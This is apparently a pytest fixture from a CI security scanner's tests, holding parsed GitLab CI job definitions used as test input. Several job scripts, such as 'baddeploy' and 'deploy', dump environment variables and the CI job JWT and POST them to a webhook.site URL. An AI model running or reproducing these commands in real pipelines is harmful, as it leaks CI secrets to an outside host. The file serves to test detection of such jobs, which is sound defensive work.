from __future__ import annotations
from typing import Any

import pytest


@pytest.fixture
def definitions() -> dict[str, Any]:
    return {
      "/checkov/tests/gitlab_ci/resources/images/.gitlab-ci.yml": {
        "default": {
          "image": "nginx:1.18",
          "services": [
            {
              "name": "privateregistry/stuff/my-postgres:11.7",
              "alias": "db-postgres",
              "__startline__": 9,
              "__endline__": 11
            },
            {
              "name": "redis:latest",
              "__startline__": 11,
              "__endline__": 12
            },
            "nginx:1.17"
          ],
          "before_script": [
            "bundle install"
          ],
          "__startline__": 2,
          "__endline__": 17
        },
        "test": {
          "script": [
            "docker run privateregistry/stuff/myimage:11.7"
          ],
          "__startline__": 18,
          "__endline__": 21
        },
        "baddeploy": {
          "script": [
            "echo \"get the envs\"\napt update\napt -y install curl\npython -c \u0027import json, os;print(json.dumps(dict(os.environ)))\u0027 \u003e env.json\ncurl -H \\\"Content-Type: application/json\\\" -X POST --data \"$CI_JOB_JWT_V1\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826\ncurl -H \\\"Content-Type: application/json\\\" -X POST --data \"@env.json\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826\n"
          ],
          "__startline__": 22,
          "__endline__": 32
        },
        "__startline__": 1,
        "__endline__": 32
      },
      "/checkov/tests/gitlab_ci/resources/curl/.gitlab-ci.yml": {
        "image": "python:3.9-buster",
        "test": {
          "script": [
            "echo \"get the envs\"\napt update\napt -y install curl\npython -c \u0027import json, os;print(json.dumps(dict(os.environ)))\u0027 \u003e env.json\ncurl -H \\\"Content-Type: application/json\\\" -X POST --data \"@env.json\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826\n"
          ],
          "__startline__": 4,
          "__endline__": 12
        },
        "deploy": {
          "script": "curl -H \\\"Content-Type: application/json\\\" -X POST --data \"$CI_JOB_JWT_V1\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826",
          "__startline__": 13,
          "__endline__": 13
        },
        "__startline__": 1,
        "__endline__": 13
      },
      "/checkov/tests/gitlab_ci/resources/two/.gitlab-ci.yml": {
        "planOnlySubset": {
          "script": "echo \"This job creates double pipelines!\"",
          "rules": [
            {
              "changes": [
                "$DOCKERFILES_DIR/*"
              ],
              "__startline__": 4,
              "__endline__": 6
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"push\"",
              "__startline__": 6,
              "__endline__": 7
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"merge_request_event\"",
              "__startline__": 7,
              "__endline__": 9
            }
          ],
          "__startline__": 2,
          "__endline__": 9
        },
        "job": {
          "script": "echo \"This job also creates double pipelines!\"",
          "rules": [
            {
              "changes": [
                "$DOCKERFILES_DIR/*"
              ],
              "__startline__": 12,
              "__endline__": 14
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"push\"",
              "__startline__": 14,
              "__endline__": 15
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"merge_request_event\"",
              "__startline__": 15,
              "__endline__": 16
            }
          ],
          "__startline__": 10,
          "__endline__": 16
        },
        "__startline__": 1,
        "__endline__": 16
      },
      "/checkov/tests/gitlab_ci/resources/rules/.gitlab-ci.yml": {
        "job": {
          "script": "echo \"This job creates double pipelines!\"",
          "rules": [
            {
              "changes": [
                "$DOCKERFILES_DIR/*"
              ],
              "__startline__": 4,
              "__endline__": 6
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"push\"",
              "__startline__": 6,
              "__endline__": 7
            },
            {
              "if": "$CI_PIPELINE_SOURCE \u003d\u003d \"merge_request_event\"",
              "__startline__": 7,
              "__endline__": 9
            }
          ],
          "__startline__": 2,
          "__endline__": 9
        },
        "__startline__": 1,
        "__endline__": 9
      },
      "/checkov/tests/gitlab_ci/image_referencer/resources/single_image/.gitlab-ci.yml": {
        "default": {
          "image": {
            "name": "redis:latest",
            "entrypoint": [
              "/bin/bash"
            ],
            "__startline__": 3,
            "__endline__": 6
          },
          "__startline__": 2,
          "__endline__": 6
        },
        "deploy": {
          "script": "curl -H \\\"Content-Type: application/json\\\" -X POST --data \"$CI_JOB_JWT_V1\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826",
          "__startline__": 7,
          "__endline__": 7
        },
        "__startline__": 1,
        "__endline__": 7
      }
    }
